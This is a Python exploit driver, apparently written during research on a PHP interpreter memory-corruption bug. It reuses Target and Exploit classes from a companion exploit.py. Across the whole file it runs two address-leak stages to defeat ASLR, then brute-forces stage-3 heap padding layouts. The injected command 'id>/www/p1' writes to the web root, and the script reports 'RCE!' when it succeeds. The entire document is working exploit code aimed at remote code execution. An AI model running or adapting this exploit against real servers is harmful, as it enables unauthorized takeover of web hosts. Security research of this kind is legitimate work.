#!/usr/bin/env python3
"""8.3.35 stage-3 scan built on exploit.py's proven Target/Exploit classes.

Runs stage1+2 (leaks), then scans stage-3 shapes (A2 pads x B2 pre-padding)
within one ASLR window. Uses exploit.py's Exploit for stage1/2 and a custom
stage3 for the scan.
"""
import os
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit

PORT = 18112
CMD = "id>/www/p1"

def main():
    t = exploit.Target(f"http://127.0.0.1:{PORT}/", timeout=30, verbose=False)
    ex = exploit.Exploit(t, CMD, zif_offset=0x3ac080, dtor_offset=0x49ec50,
                         htdata_offset=0x690d8, huge_mb=256, verbose=False,
                         profile="bookworm")

    # stage 1
    chunk = 0
    for a in range(4):
        ex.rotate()
        chunk = ex.stage1()
        if chunk: break
    if not chunk:
        print("[-] stage1 failed"); return 1
    print(f"[+] chunk=0x{chunk:x}", flush=True)

    # stage 2
    libphp = 0
    for a in range(4):
        ex.rotate()
        libphp = ex.stage2()
        if libphp: break
    if not libphp:
        print("[-] stage2 failed"); return 1
    print(f"[+] libphp=0x{libphp:x}", flush=True)

    htdata = chunk + 0x690d8
    zif = libphp + 0x3ac080
    print(f"[*] htdata=0x{htdata:x} zif=0x{zif:x}", flush=True)

    # stage 3 scan: vary A2 pads (n) and B2 pre-padding (b2)
    a2_counts = [2, 3, 4, 5, 6, 8, 10, 12]
    b2_pres = [0, 1, 2, 3, 4, 6, 8]
    for n in a2_counts:
        for b2 in b2_pres:
            ex.stage3_pads = [(31, 31)] * n
            ex.stage3_b2_pre = b2
            ex.rotate()
            ex.stage3(htdata, zif)
            time.sleep(0.7)
            status, body = t.get("/p1")
            hit = (status == 200 and b"uid=" in body)
            print(f"  a2n={n} b2={b2} -> {'HIT' if hit else 'miss'} ({status})", flush=True)
            if hit:
                print(f"[+] RCE! a2n={n} b2={b2}: {body.decode('latin1').strip()}")
                return 0
    print("[-] no combo worked")
    return 1

if __name__ == "__main__":
    sys.exit(main())
